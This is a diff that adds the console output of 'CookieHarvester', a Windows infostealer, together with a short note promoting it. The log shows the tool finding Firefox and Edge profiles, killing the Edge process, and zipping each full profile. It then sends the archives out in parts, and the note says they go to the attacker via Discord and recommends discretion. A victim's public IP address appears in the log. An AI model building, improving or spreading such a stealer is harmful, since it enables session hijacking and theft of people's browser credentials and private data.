@@ -1,0 +1,49 @@
+[DEBUG] === VERIFICANDO REQUESTS ===
+[+] Requests SI disponible
+
+[DEBUG] === INICIO DE MAIN (Windows) ===
+============================================================
+  CookieHarvester v5.0.9_Win_FINAL - Windows Edition
+============================================================
+[+] Objetivo: win@Windows11Pro
+[+] IP Pública: 45.163.205.83
+[+] Navegadores abiertos: Edge
+[+] Directorio temporal: C:\Users\win\AppData\Local\Temp\c4_4z8kfptu
+
+[+] Perfiles encontrados: 2
+    - Firefox: C:\Users\win\AppData\Roaming\Mozilla\Firefox\Profiles\v2wnx2hb.default-release
+    - Edge: C:\Users\win\AppData\Local\Microsoft\Edge\User Data\Default
+
+[DEBUG] === PROCESAR_PERFIL: Firefox ===
+[DEBUG] Ruta: C:\Users\win\AppData\Roaming\Mozilla\Firefox\Profiles\v2wnx2hb.default-release
+[+] Perfil COMPLETO copiado (Firefox)
+[DEBUG] Creando ZIP...
+[DEBUG] ZIP: 40.41 MB, 6 parte(s)
+[DEBUG] Parte 1 enviada
+[DEBUG] Parte 2 enviada
+[DEBUG] Parte 3 enviada
+[DEBUG] Parte 4 enviada
+[DEBUG] Parte 5 enviada
+[DEBUG] Parte 6 enviada
+
+[DEBUG] === PROCESAR_PERFIL: Edge ===
+[DEBUG] Ruta: C:\Users\win\AppData\Local\Microsoft\Edge\User Data\Default
+[*] Edge está abierto, cerrándolo para copia completa...
+    [+] Cerrado: msedge.exe
+[+] Perfil COMPLETO copiado (Edge)
+[DEBUG] Creando ZIP...
+[DEBUG] ZIP: 57.83 MB, 8 parte(s)
+[DEBUG] Parte 1 enviada
+[DEBUG] Parte 2 enviada
+[DEBUG] Parte 3 enviada
+[DEBUG] Parte 4 enviada
+[DEBUG] Parte 5 enviada
+[DEBUG] Parte 6 enviada
+[DEBUG] Parte 7 enviada
+[DEBUG] Parte 8 enviada
+
+[+] Limpieza completada (sin autodestrucción).
+============================================================
+PS C:\Users\win\Documents\Codes>
+
+A small session cookie slab, takes with it the entire Firefox browser profile folder and sends it in small zip-format compressed files to the attacker via Discord, has been tested in the Fedora 44 KDE environment and works perfectly, discretion is recommended and the code is observed.
